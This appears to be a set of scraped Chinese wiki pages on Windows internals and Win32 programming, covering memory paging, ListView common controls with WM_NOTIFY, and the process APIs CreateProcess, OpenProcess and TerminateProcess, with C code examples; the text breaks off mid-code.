物理内存+虚拟内存（硬盘）物理内存+虚拟内存（硬盘） 物理内存+虚拟内存（硬盘） 物理内存 这里的物理内存是指插的内存条的大小。在VM上就是虚拟机配置的内存大小 在任务管理器中可以看到系统可用的物理页总数是1047984K，这个数是接近于1GB÷1024B=1048576K的 230÷210=2202^{30}÷2^{10}=2^{20}230÷210=220，1048576K 1047984K ÷ 4，转为物理页数量，为261996个物理页，十六进制是3FF6Ch 双击调试后使用如下命令可以看该系统中的总物理内存页面数 以双字形式显示MmNumberOfPhysicalPages存储的值1dd MmNumberOfPhysicalPages MmNumberOfPhysicalPages*4=物理内存 123456789kd&gt; dd MmNumberOfPhysicalPages805599c8 0003ff6c 00000040 00000000 7fff0000805599d8 80000000 7ffeffff 00000000 00000000805599e8 00000000 00000000 00000000 00000000805599f8 00000000 00000000 0000000c 0000000080559a08 00000000 00000000 00000000 0000000080559a18 00000000 00000000 00000000 0000000080559a28 00000000 00000000 00000000 0000000080559a38 00000000 00000000 00000000 00000000 虚拟内存（硬盘） 将内存中暂时用不到的数据放到硬盘中，需要时再从硬盘中换回内存。 这个虚拟内存（硬盘）的大小可设置 可以在C盘下查看（需要显示隐藏文件）pagefile.sys这个文件，它刚好是768MB这个大小，这个文件就是用来做虚拟内存的： 能够识别的物理内存 上面是可供使用的物理内存，但并不是说主机上插的内存条越多，操作系统都能识别。 32位操作系统最多可以识别物理内存为64G（2-9-9-12分页模式下），但是操作系统会进行限制，例如XP系统只能识别4G的物理内存（而内核一样的服务器版Windows Server 2003可以识别4G以上）。 可以通过HOOK系统函数来突破XP操作系统的4GB限制，让内存识别范围超过4GB 无时无刻的缺页异常 假设进程A在使用线性地址003A000，操作系统会为该地址分配相应的物理内存地址（挂物理页），当进程A不使用时，操作系统会将这个物理页上的数据存到pagefile.sys文件中，然后将这个物理页分配给其他需要使用的进程。当进程A再次需要访问线性地址003A000时，发生缺页异常，由操作系统为该线性地址再次挂上物理页，并将数据从pagefile.sys文件写到新的物理页中，进程A又能访问到它的数据了。这些对应用开发者，程序用户来说是透明的。 小结 弄清以下问题即可： 什么是虚拟内存，什么是物理内 存 虚拟内存有多少，哪一块用了，哪一块没用 物理内存有多少，物理内存是怎么管理的 物理内存能识别多少和能使用多少"},{"title":"通用控件","path":"/wiki/Windows_API/通用控件.html","content":"前言 以编写MyLordPE主界面为例，来讲解如何使用通用控件。 上面是进程列表，显示出系统中所有进程的进程名，PID号，ImageBase，SizeOfImage 下面是模块列表，当选中进程列表中的某一个进程时，会在模块列表中显示出被选中进程中的所有模块的模块名和路径 标准控件与通用控件 新建一个对话框，左右各弄一个Group Box，弄下布局，拉几个Button，改下名字，属性，调下布局，显示一下。 代码123456789101112131415161718192021222324252627#include &lt;Windows.h&gt;#include &quot;resource.h&quot;BOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)&#123; DialogBox(hInstance, //当前程序的实例句柄 MAKEINTRESOURCE(IDD_DIALOG_MAIN), //对话框模板的名称或资源标识符 NULL, //父窗口句柄，这里无，为NULL DialogProc //对话框消息处理函数 ); return 0;&#125;BOOL CALLBACK DialogProc(HWND hwndDlg, // handle to dialog box UINT uMsg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter )&#123; return FALSE;&#125; 上下各拉一个List Control，上面的用于显示进程，下面的用于显示进程中的模块。对List Control右键，修改ID名字，修改视图为Report。 在Windows中，标准控件总是可用的，不需要特殊的库或链接操作。这些控件可以直接从资源视图中拖拉到窗体上，无需额外代码支持。 这些都是Windows标准控件12345678Static\tGroup Box\tButton\tCheck Box\tRadio Button\tEdit\tComboBox\tListBox 而通用控件，因为不常用，不是默认加载的，需要在程序中显式引用相应的库。如果程序中使用了这些控件，则必须包含相关头文件，并链接到相应的库以确保控件代码被编译到可执行文件中。 这些都是Windows通用控件1234567891011121314151617181920212223AnimationComboBoxEx Date_and_Time_Picker Drag_List_Box Flat_Scroll_Bar Header HotKey ImageList IPAddress List_View Month_Calendar Pager Progress_Bar Property_Sheets Rebar Status Bars SysLink Tab Toolbar ToolTip Trackbar TreeView Up_and_Down 要使用这些控件，必须包含&lt;commctrl.h&gt;头文件并链接comctl32.lib库： 12#include &lt;commctrl.h&gt;#pragma comment(lib,&quot;comctl32.lib&quot;) 同时，需要初始化控件库。通过调用 InitCommonControlsEx 函数实现，告诉Windows加载器加载公共控件 DLL (Comctl32.dll)中的哪些公共控件类。 1234typedef struct tagINITCOMMONCONTROLSEX &#123; DWORD dwSize; // 标识该结构体大小 DWORD dwICC; // 位标志集，指示将从DLL中加载哪些公共控件类&#125; INITCOMMONCONTROLSEX, *LPINITCOMMONCONTROLSEX; dwICC字段是一个一个标志位或起来，如果用的控件太多，嫌一个个或太麻烦，写ICC_WIN95_CLASSES，ICC_WIN95_CLASSES就是将常用的控件都或起来了。 INITCOMMONCONTROLSEX structure (commctrl.h) 1234567//放到显示控件之前//在本文的例子中就是放到WinMain函数里的前面，放到显示对话框前INITCOMMONCONTROLSEX icex;icex.dwSize = sizeof(INITCOMMONCONTROLSEX);icex.dwICC = ICC_WIN95_CLASSES; //设置控件集合，ICC_WIN95_CLASSES，包括所有初版Windows 95控件InitCommonControlsEx(&amp;icex); //传入icex结构体初始化通用控件库 VS中不需要加这些也能显示，应该是项目配置中包含了相应的库，或通用控件已经被内置了 ListView的使用 WM_INITDIALOG初始化对话框时设置下两个ListView显示的内容 1234567case WM_INITDIALOG: //对话框创建的消息，像之前写窗口程序时的WM_CREATE &#123; //初始化ListView InitProcessListView(hwndDlg); //设置ListView_Process InitModuleListView(hwndDlg); //设置ListView_Module return TRUE; &#125; List Control也是一个子窗口，GetDlgItem获得它的句柄，通过SendMessage发消息给它来设置风格 1234//获取IDC_LIST_PROCESS的句柄HWND hListProcess = GetDlgItem(hwndDlg, IDC_LIST_PROCESS);//设置ListView控件的扩展样式，这里是使整行可以被选中 点击某一行该行全部选中SendMessage(hListProcess, LVM_SETEXTENDEDLISTVIEWSTYLE, LVS_EX_FULLROWSELECT, LVS_EX_FULLROWSELECT); LVM_SETEXTENDEDLISTVIEWSTYLE：ListView消息，用于设置扩展样式。 LVS_EX_FULLROWSELECT（第一个）：要修改的样式，这里是指&quot;整行选择&quot;。 LVS_EX_FULLROWSELECT（第二个）：设置为此样式。传递两次同样的值意味着将此样式设置为启用（相对于可能的其他操作，如清除样式等） LVCOLUMNA结构体用于描述report view视图的信息 123456LV_COLUMN lv = &#123; 0 &#125;; //顺带初始化为0//第0列lv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;\t//要设置列的文本、宽度和子项索引lv.pszText = (LPWSTR)TEXT(&quot;Process&quot;);\t//列标题lv.cx = 150; //列宽lv.iSubItem = 0; //列号 lv.mask 设定mask指定结构体中哪些字段有效，即指明哪些属性将被设置，在这个例子中，文本，宽度，子项索引将被设置 文本（LVCF_TEXT）：每列的标题。 宽度（LVCF_WIDTH）：列的显示宽度。 子项索引（LVCF_SUBITEM）：定义列的序号，确保列按照期望的顺序出现。 lv.pszText lv.pszText是非const型的字符型指针，TEXT(“Process”)是常量字符串。 1lv.pszText = TEXT(&quot;Process&quot;);\t//非const指针指向const字符串 在C++11以上会报错，这里用强转的方式解决 lv.iSubItem 列号从0开始 设置完后还是发消息来设置这一列显示的内容 1SendMessage(hListProcess,LVM_INSERTCOLUMN,0,(DWORD)&amp;lv); 等价写法，用ListView_InsertColumn宏，这个宏内部就是用SendMessage来实现的 1ListView_InsertColumn(hListProcess, 0, &amp;lv); InitProcessListView函数InitModuleListView函数完整代码设置上面的List Control 12345678910111213141516171819202122232425262728293031323334353637VOID InitProcessListView(HWND hwndDlg)&#123;\t//获取IDC_LIST_PROCESS的句柄\tHWND hListProcess = GetDlgItem(hwndDlg, IDC_LIST_PROCESS);\t//设置ListView控件的扩展样式，这里是使整行可以被选中 点击某一行该行全部选中\tSendMessage(hListProcess, LVM_SETEXTENDEDLISTVIEWSTYLE, LVS_EX_FULLROWSELECT, LVS_EX_FULLROWSELECT);\tLV_COLUMN lv = &#123; 0 &#125;; //顺带初始化为0，因为在堆栈中是随机值\t//第0列\tlv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;\t//要设置列的文本、宽度和子项索引\tlv.pszText = (LPWSTR)TEXT(&quot;Process&quot;); //列标题\tlv.cx = 150; //列宽\tlv.iSubItem = 0; //列号\t//SendMessage(hListProcess,LVM_INSERTCOLUMN,0,(DWORD)&amp;lv);\tListView_InsertColumn(hListProcess, 0, &amp;lv); //插入第0列\t//第1列\tlv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;\tlv.pszText = (LPWSTR)TEXT(&quot;PID&quot;); //列标题\tlv.cx = 120; //列宽\tlv.iSubItem = 1; //列号\tListView_InsertColumn(hListProcess, 1, &amp;lv);\t//第2列\tlv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;\tlv.pszText = (LPWSTR)TEXT(&quot;ImageBase&quot;); //列标题\tlv.cx = 120; //列宽\tlv.iSubItem = 2; //列号\tListView_InsertColumn(hListProcess, 2, &amp;lv);\t//第3列\tlv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;\tlv.pszText = (LPWSTR)TEXT(&quot;SizeOfImage&quot;); //列标题\tlv.cx = 120; //列宽\tlv.iSubItem = 3; //列号\tListView_InsertColumn(hListProcess, 3, &amp;lv);&#125;设置下面的List Control 123456789101112131415161718192021VOID InitModuleListView(HWND hwndDlg)&#123;\t//获取IDC_LIST_PROCESS句柄\tHWND hListModule = GetDlgItem(hwndDlg, IDC_LIST_MODULE);\t//设置整行选中\tSendMessage(hListModule, LVM_SETEXTENDEDLISTVIEWSTYLE, LVS_EX_FULLROWSELECT, LVS_EX_FULLROWSELECT);\tLV_COLUMN lv = &#123; 0 &#125;;\t//设置第0列\tlv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;\tlv.pszText = (LPWSTR)TEXT(&quot;Name&quot;); //列标题\tlv.cx = 90; //列宽\tlv.iSubItem = 0; //列下标\tListView_InsertColumn(hListModule, 0, &amp;lv);\t//设置第1列\tlv.pszText = (LPWSTR)TEXT(&quot;Path&quot;);\tlv.cx = 250;\tlv.iSubItem = 1;\tListView_InsertColumn(hListModule, 1, &amp;lv);&#125;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118#include &lt;Windows.h&gt;#include &quot;resource.h&quot;\t#include &lt;commctrl.h&gt;#pragma comment(lib,&quot;comctl32.lib&quot;)BOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);VOID InitProcessListView(HWND hwndDlg);VOID InitModuleListView(HWND hwndDlg);int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)&#123; DialogBox(hInstance, //当前程序的实例句柄 MAKEINTRESOURCE(IDD_DIALOG_MAIN), //对话框模板的名称或资源标识符 NULL, //父窗口句柄，这里无，为NULL DialogProc //对话框消息处理函数 ); return 0;&#125;BOOL CALLBACK DialogProc(HWND hwndDlg, // handle to dialog box UINT uMsg, // message WPARAM wParam, // first message parameter LPARAM lParam // second message parameter )&#123; switch (uMsg) &#123; case WM_CLOSE: EndDialog(hwndDlg, 0); return TRUE; case WM_INITDIALOG: //对话框创建的消息，像之前写窗口程序时的WM_CREATE &#123; //初始化ListView InitProcessListView(hwndDlg); //设置ListView_Process InitModuleListView(hwndDlg); //设置ListView_Module return TRUE; &#125; case WM_COMMAND: switch (LOWORD(wParam)) &#123; case IDC_BUTTON_ABOUT: return TRUE; case IDC_BUTTON_EXIT: EndDialog(hwndDlg, 0); //关闭对话框 return TRUE; &#125; break; &#125; return FALSE;&#125;VOID InitProcessListView(HWND hwndDlg)&#123;\t//获取IDC_LIST_PROCESS的句柄\tHWND hListProcess = GetDlgItem(hwndDlg, IDC_LIST_PROCESS);\t//设置ListView控件的扩展样式，这里是使整行可以被选中 点击某一行该行全部选中\tSendMessage(hListProcess, LVM_SETEXTENDEDLISTVIEWSTYLE, LVS_EX_FULLROWSELECT, LVS_EX_FULLROWSELECT);\tLV_COLUMN lv = &#123; 0 &#125;; //顺带初始化为0，因为在堆栈中是随机值\t//第0列\tlv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;\t//要设置列的文本、宽度和子项索引\tlv.pszText = (LPWSTR)TEXT(&quot;Process&quot;); //列标题\tlv.cx = 150; //列宽\tlv.iSubItem = 0; //列号\t//SendMessage(hListProcess,LVM_INSERTCOLUMN,0,(DWORD)&amp;lv);\tListView_InsertColumn(hListProcess, 0, &amp;lv); //插入第0列\t//第1列\tlv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;\tlv.pszText = (LPWSTR)TEXT(&quot;PID&quot;); //列标题\tlv.cx = 120; //列宽\tlv.iSubItem = 1; //列号\tListView_InsertColumn(hListProcess, 1, &amp;lv);\t//第2列\tlv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;\tlv.pszText = (LPWSTR)TEXT(&quot;ImageBase&quot;); //列标题\tlv.cx = 120; //列宽\tlv.iSubItem = 2; //列号\tListView_InsertColumn(hListProcess, 2, &amp;lv);\t//第3列\tlv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;\tlv.pszText = (LPWSTR)TEXT(&quot;SizeOfImage&quot;); //列标题\tlv.cx = 120; //列宽\tlv.iSubItem = 3; //列号\tListView_InsertColumn(hListProcess, 3, &amp;lv);&#125;VOID InitModuleListView(HWND hwndDlg)&#123;\t//获取IDC_LIST_PROCESS句柄\tHWND hListModule = GetDlgItem(hwndDlg, IDC_LIST_MODULE);\t//设置整行选中\tSendMessage(hListModule, LVM_SETEXTENDEDLISTVIEWSTYLE, LVS_EX_FULLROWSELECT, LVS_EX_FULLROWSELECT);\tLV_COLUMN lv = &#123; 0 &#125;;\t//设置第0列\tlv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;\tlv.pszText = (LPWSTR)TEXT(&quot;Name&quot;); //列标题\tlv.cx = 90; //列宽\tlv.iSubItem = 0; //列下标\tListView_InsertColumn(hListModule, 0, &amp;lv);\t//设置第1列\tlv.pszText = (LPWSTR)TEXT(&quot;Path&quot;);\tlv.cx = 250;\tlv.iSubItem = 1;\tListView_InsertColumn(hListModule, 1, &amp;lv);&#125; 显示内容 场景需求：上面ProcessList中显示内容。 这里以写死的值来展示如何在ListControl中添加内容。 创建一个LV_ITEM结构体，这个结构体用于描述list-view item。和上面IniteProcessList时用LV_COLUMN结构体用法相似，都是设置mask，给成员赋值，然后给窗体发消息进行设置。 注意：第0行发消息是发LVM_INSERTITEM（宏是ListView_InsertItem），剩余列的数据发消息是发LVM_SETITEM（宏是ListView_SetItem）。这是因为每个行必须首先存在，才能在其上设置其他列的值。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647VOID UpdateProcessListView(HWND hwndDlg)&#123;\t//获取IDC_LIST_PROCESS的句柄\tHWND hListProcess = GetDlgItem(hwndDlg, IDC_LIST_PROCESS);\tLV_ITEM vitem = &#123; 0 &#125;;\tvitem.mask = LVIF_TEXT; //设置文本\t//第一行的数据\tvitem.pszText = (LPWSTR)TEXT(&quot;csrss.exe&quot;);\tvitem.iItem = 0; //第0行\tvitem.iSubItem = 0; //第0列\t//SendMessage(hListProcess, LVM_INSERTITEM, (DWORD)&amp;vitem);\tListView_InsertItem(hListProcess, &amp;vitem); //行数据的第0列是插入Insert\tvitem.pszText = (LPWSTR)TEXT(&quot;448&quot;);\tvitem.iSubItem = 1; //第1列\t//SendMessage(hListProcess, LVM_SETITEM, (DWORD)&amp;vitem);\tListView_SetItem(hListProcess, &amp;vitem); //剩余的列数据是Set\tvitem.pszText = (LPWSTR)TEXT(&quot;56590000&quot;);\tvitem.iSubItem = 2; //第2列\tListView_SetItem(hListProcess, &amp;vitem);\tvitem.pszText = (LPWSTR)TEXT(&quot;000F0000&quot;);\tvitem.iSubItem = 3; //第3列\tListView_SetItem(hListProcess, &amp;vitem);\t//第二行的数据\tvitem.pszText = (LPWSTR)TEXT(&quot;winlogon.exe&quot;);\tvitem.iItem = 1; //第1行\tvitem.iSubItem = 0; //第0列\tListView_InsertItem(hListProcess, &amp;vitem); //行数据的第0列是插入Insert\tvitem.pszText = (LPWSTR)TEXT(&quot;456&quot;);\tvitem.iSubItem = 1; //第1列\tListView_SetItem(hListProcess, &amp;vitem); //剩余的列数据是Set\tvitem.pszText = (LPWSTR)TEXT(&quot;10000000&quot;);\tvitem.iSubItem = 2; //第2列\tListView_SetItem(hListProcess, &amp;vitem);\tvitem.pszText = (LPWSTR)TEXT(&quot;000045800&quot;);\tvitem.iSubItem = 3; //第3列\tListView_SetItem(hListProcess, &amp;vitem);&#125; WM_NOTIFY消息类型 前言 场景需求：点鼠标选中上面ProcessList中的某一行时，下面的ListView就显示出该进程中的所有模块。 之前我们学习的标准控件，比如按钮，它比较简单，我们是在父窗口的WM_COMMAND中在用一个switch去匹配子窗口ID来做处理。而通用控件太复杂了，产生点击的可能性很多。比如在我们这个例子中，用户可能点击Process、PID、ImageBase、SizeOfImage中任一个列，可能选中ProcessList列表中任意一行等。所以需要一个额外的结构体来描述消息的来源，通俗来将就是在通用控件上做了什么事。 WM_NOTIFY 通用控件也是子窗口，都是由系统的回调函数处理后交由父窗口的回调函数处理。通用控件的消息类型是WM_NORIFY消息类型，该消息类型与WM_COMMAND类型相似，都是由子窗口向父窗口发送的消息。WM_NOTIFY可以包含比WM_COMMAND更丰富的信息，Windows通用组件中有很多消息，都是通过WM_NOTIFY来描述的。 产生WM_NOTIFY消息时各参数含义123456789wParam:控件ID lParam:指向一个结构 typedef struct tagNMHDR &#123; HWND hwndFrom; //窗口句柄，指明哪个窗口发过来的消息 UINT idFrom; //窗口ID号，指明窗口上哪个控件发过来的消息 UINT code; //通知码，如LVM_SELCHANGED &#125; NMHDR; hwndFrom：窗口句柄，指明是哪个窗口发送的WM_NOTIFY消息 idFrom：子窗口ID号，指明是那个窗口上的哪个子窗口发送的WM_NOTIFY消息 code：通知码。在控件上做了什么事，比如点击鼠标左键，点右键等 NMHDR structure能满足一般的要求，但能描述的信息还是有限的。如果是一个特别复杂的通用控件，lParam指向一个拓展后的结构体。无论未来新增的通用控件多么复杂，都能通过拓展lParam指向的结构体，来携带更多的信息到父窗口的消息处理函数中。 举的3个扩展后的结构体的例子123456789101112131415161718typedef struct tagNMLVCACHEHINT &#123; NMHDR hdr; int iFrom; int iTo; &#125; NMLVCACHEHINT, *PNMLVCACHEHINT; typedef struct tagLVDISPINFO &#123; NMHDR hdr; LVITEM item; &#125; NMLVDISPINFO, FAR *LPNMLVDISPINFO; typedef struct _NMLVFINDITEM &#123; NMHDR hdr; int iStart; LVFINDINFO lvfi; &#125; NMLVFINDITEM, *PNMLVFINDITEM; //... 上面举的3个结构体的例子，相同点都有NMHDR类型的成员，这就是继承。Windows程序中一行C++都没有，但用C实现了面向对象的特性。 小结 通用控件使用WM_NOTIFY接收消息。当产生WM_NOTIFY消息时，lParam指向一个结构体，这个结构式可拓展，用于让通用控件携带更多的信息去到父窗口的消息处理函数中。 代码实现 回到场景需求：点鼠标选中上面ProcessList中的某一行时，下面的ListView就显示出该进程中的所有模块。 在WM_NOTIFY消息中匹配 WM_NOTIFY消息类型EnumModules函数12345678910case WM_NOTIFY:&#123;\tauto pNMHDR = (NMHDR*)lParam;\tif (wParam == IDC_LIST_PROCESS &amp;&amp; pNMHDR-&gt;code == NM_CLICK) //Process List控件 点击鼠标左键\t&#123; //MessageBox(0, 0, 0, 0); //测一下 EnumModules(GetDlgItem(hwndDlg, IDC_LIST_PROCESS), wParam, lParam); //函数：枚举进程中模块并显示在模块列表中\t&#125;\treturn TRUE;&#125;123456789101112131415161718192021VOID EnumModules(HWND hListProcess, WPARAM wParam, LPARAM lParam)&#123;\t//得知用户选的是哪一行\tDWORD dwRowID = SendMessage(hListProcess, LVM_GETNEXTITEM, -1, LVNI_SELECTED);\tif (-1 == dwRowID)\t&#123; MessageBox(NULL, TEXT(&quot;请选择进程&quot;), TEXT(&quot;Error!&quot;), MB_OK); return;\t&#125;\tTCHAR szPid[0x20] = &#123; 0 &#125;;\tLV_ITEM lv = &#123; 0 &#125;;\t//获取PID，用于后续遍历该进程中的模块，填充到Module List中\tlv.iSubItem = 1; //要获取的列\tlv.pszText = szPid; //存查询结构的缓冲区\tlv.cchTextMax = 0x20; //缓冲区大小\tSendMessage(hListProcess, LVM_GETITEMTEXT, dwRowID, (DWORD)&amp;lv);\tMessageBox(NULL, szPid, TEXT(&quot;PID&quot;), MB_OK); //弹窗，看是否得到进程列表中的PID值&#125; 作业 遍历进程，遍历进程中的模块"},{"title":"进程相关API","path":"/wiki/Windows_API/进程相关API.html","content":"ID与句柄 使用CreateProcess创建进程时会返回一个结构体LPPROCESS_INFORMATION，里面是进程句柄，线程句柄，进程ID，线程ID字段。我们已经知道句柄就是当前进程私有句柄表里的一个索引了，那么这里就讲讲ID是什么。 123456typedef struct _PROCESS_INFORMATION &#123; HANDLE hProcess; //进程句柄 HANDLE hThread; //线程句柄 DWORD dwProcessId; //进程id DWORD dwThreadId; //线程id&#125; PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION; 每个进程都会有一张私有的句柄表，表里存储了当前进程创建，打开的所有内核对象。 实际上，操作系统还有一张句柄表，这张表是全局的。这张全局句柄表包含了操作系统中所有正运行中的进程、线程。如下图，左边那一列是索引（进程ID和线程ID），右边是存储的进程、线程内核对象地址。PROCESS_INFORMATION中的进程ID和线程ID就是这个索引号。 进程ID（Process ID）可以通过任务管理器看到。这个PID号是唯一的，不会有两个进程的PID号相同。一个进程结束后，它的PID号可能分配给另一个新的进程。 线程ID也是唯一的，不会出现某两个线程，某个进程和某个线程，某两个进程的id号一样。 证明全局和私有 PID是全局的，在任何进程中都有意义，都可以使用，而句柄则是局部的、私有的。下面让其他进程分别使用目标进程的句柄（私有的）和PID号（全局的）来关闭目标进程notepad，来证明全局和私有。 例 被关闭的目标程序 这个程序会启动notepad应用程序，并打印其进程ID（PID）和句柄值 123456789101112131415161718192021222324252627282930313233343536#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(&amp;si, sizeof(si)); si.cb = sizeof(si); ZeroMemory(&amp;pi, sizeof(pi)); // 创建记事本进程 if (!CreateProcess( TEXT(&quot;C:\\\\Windows\\\\System32\\ otepad.exe&quot;), // 程序名称 NULL, // 命令行参数 NULL, // 进程安全属性 NULL, // 线程安全属性 FALSE, // 句柄继承选项 0, // 创建标志 NULL, // 使用父进程的环境变量 NULL, // 使用父进程的当前目录 &amp;si, // 指向STARTUPINFO的指针 &amp;pi // 指向PROCESS_INFORMATION的指针 )) &#123; printf(&quot;CreateProcess failed (%d). &quot;, GetLastError()); return 1; &#125; printf(&quot;Notepad launched with PID: %x &quot;, pi.dwProcessId); printf(&quot;Notepad handle: %x &quot;, pi.hProcess); // 阻塞等待，直到按下任意键 getchar(); return 0;&#125; 尝试使用私有句柄终止进程尝试使用PID号打开进程并结束进程1234BOOL TerminateProcess( [in] HANDLE hProcess, [in] UINT uExitCode); TerminateProcess函数函数用于结束进程和该进程所有线程 uExitCode：关闭进程后退出的ExitCode，自己指定。随后可以用GetExitCodeProcess函数捕捉到这个ExitCode。 TerminateProcess函数 Terminates the specified process and all of its threads. 1[in] hProcess A handle to the process to be terminated. The handle must have the PROCESS_TERMINATE access right. For more information, see Process Security and Access Rights. 1[in] uExitCode The exit code to be used by the process and threads terminated as a result of this call. Use the GetExitCodeProcess function to retrieve a process’s exit value. Use the GetExitCodeThread function to retrieve a thread’s exit value. 在程序B中，将notepad的私有句柄传给TerminateProcess函数来尝试关掉notepad进程。因为这个句柄是notepad私有的，对程序B没有意义，所以关闭失败。 1234567891011121314151617#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; //输入目标程序的私有句柄 HANDLE hProcess = (HANDLE)0x114; // 尝试终止进程 if (!TerminateProcess(hProcess, 0)) &#123; printf(&quot;TerminateProcess failed (%d). &quot;, GetLastError()); &#125; else &#123; printf(&quot;Notepad terminated successfully. &quot;); &#125; return 0;&#125; 12345HANDLE OpenProcess( [in] DWORD dwDesiredAccess, [in] BOOL bInheritHandle, [in] DWORD dwProcessId); OpenProcess函数用于打开一个已存在的进程 dwDesiredAccess：打开的目标进程希望拥有什么权限 bInheritHandle：打开目标进程后得到的的这个句柄能否被子进程继承 如果允许，在这个程序中在创建一个子进程，子进程就可以继承这个句柄 dwProcessId：目标进程的PID OpenProcess函数 Opens an existing local process object. 1[in] dwDesiredAccess The access to the process object. This access right is checked against the security descriptor for the process. This parameter can be one or more of the process access rights. If the caller has enabled the SeDebugPrivilege privilege, the requested access is granted regardless of the contents of the security descriptor. 1[in] bInheritHandle If this value is TRUE, processes created by this process will inherit the handle. Otherwise, the processes do not inherit this handle. 1[in] dwProcessId The identifier of the local process to be opened. If the specified process is the System Idle Process (0x00000000), the function fails and the last error code is ERROR_INVALID_PARAMETER. If the specified process is the System process or one of the Client Server Run-Time Subsystem (CSRSS) processes, this function fails and the last error code is ERROR_ACCESS_DENIED because their access restrictions prevent user-level code from opening them. If you are using GetCurrentProcessId as an argument to this function, consider using GetCurrentProcess instead of OpenProcess, for improved performance. 通过PID号使用OpenProcess函数来得到一个指向notepad进程的新句柄，这个新句柄是当前进程特有的，它不同于原始进程（在这里例子中是记事本）创建时获取的句柄。因为程序中说了要用PROCESS_TERMINATE访问权限，这意味着得到的句柄可以用来终止目标进程。 123456789101112131415161718192021222324252627282930#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; HANDLE hProcess; //填入目标进程的PID号 DWORD dwProcessId = 0x6b2c; // 使用PID打开进程 hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwProcessId); if (hProcess == NULL) &#123; printf(&quot;OpenProcess failed (%d). &quot;, GetLastError()); return 1; &#125; // 尝试终止进程 if (!TerminateProcess(hProcess, 0)) &#123; printf(&quot;TerminateProcess failed (%d). &quot;, GetLastError()); &#125; else &#123; printf(&quot;Notepad terminated successfully. &quot;); &#125; // 关闭句柄 CloseHandle(hProcess); return 0;&#125; CreateProcess 通过前面的学习已经知道了CreateProcess函数中的一些参数，现在讲下剩下的几个参数 123456789101112BOOL CreateProcess( LPCWSTR lpApplicationName, // 要启动的程序名（要完整文件路径） LPWSTR lpCommandLine, // 命令行参数 LPSECURITY_ATTRIBUTES lpProcessAttributes, // 进程句柄是否允许/可以被继承 LPSECURITY_ATTRIBUTES lpThreadAttributes, // 线程句柄是否允许/可以被继承 BOOL bInheritHandles, // 是否继承句柄 DWORD dwCreationFlags, // LPVOID lpEnvironment, // LPCWSTR lpCurrentDirectory, // LPSTARTUPINFOW lpStartupInfo, // 启动信息 LPPROCESS_INFORMATION lpProcessInformation // OUT参数，传出进程和线程的信息); lpEnvironment：表示当前创建进程的环境块，这个参数一般没什么用，填NULL 1[in, optional] lpEnvironment A pointer to the environment block for the new process. If this parameter is NULL, the new process uses the environment of the calling process. An environment block consists of a null-terminated block of null-terminated strings. Each string is in the following form: name=value\\0 Because the equal sign is used as a separator, it must not be used in the name of an environment variable. An environment block can contain either Unicode or ANSI characters. If the environment block pointed to by lpEnvironment contains Unicode characters, be sure that dwCreationFlags includes CREATE_UNICODE_ENVIRONMENT. The ANSI version of this function, CreateProcessA fails if the total size of the environment block for the process exceeds 32,767 characters. Note that an ANSI environment block is terminated by two zero bytes: one for the last string, one more to terminate the block. A Unicode environment block is terminated by four zero bytes: two for the last string, two more to terminate the block. dwCreationFlags The flags that control the priority class and the creation of the process. For a list of values, see Process Creation Flags. 这个参数用于控制新进程的创建方式。比如创建想让创建的子进程单独起一个cmd输出，就将dwCreationFlags字段设置为CREATE_NEW_CONSOLE The new process has a new console, instead of inheriting its parent’s console (the default). For more information, see Creation of a Console. This flag cannot be used with DETACHED_PROCESS. 例 被调用程序A 1234567#include &lt;stdio.h&gt;int main() &#123; printf(&quot;Hello from Program A! &quot;); getchar(); return 0;&#125; dwCreationFlags置NULLdwCreationFlags使用 CREATE_NEW_CONSOLE123456789101112131415161718192021222324252627282930313233343536373839#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; printf(&quot;Hello from Program B! &quot;); STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(&amp;si, sizeof(si)); si.cb = sizeof(si); ZeroMemory(&amp;pi, sizeof(pi)); // 创建进程A，不使用 CREATE_NEW_CONSOLE if (!CreateProcess( TEXT(&quot;D:/005_Codefield/VS2019/DiShui_Test/Debug/TestA.exe&quot;), // 要启动的程序名 NULL, // 命令行参数 NULL, // 进程句柄不允许/可以被继承 NULL, // 线程句柄不允许/可以被继承 FALSE, // 不继承父进程句柄 0, // 创建标志，0表示没有设置 NULL, // NULL, // &amp;si, // 指向STARTUPINFO的指针 &amp;pi // 指向PROCESS_INFORMATION的指针 )) &#123; printf(&quot;CreateProcess failed (%d). &quot;, GetLastError()); return 1; &#125; // 等待进程A结束 WaitForSingleObject(pi.hProcess, INFINITE); // 关闭进程和线程的句柄 CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 0;&#125; 子进程就会和父进程共用一个cmd 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main() &#123; 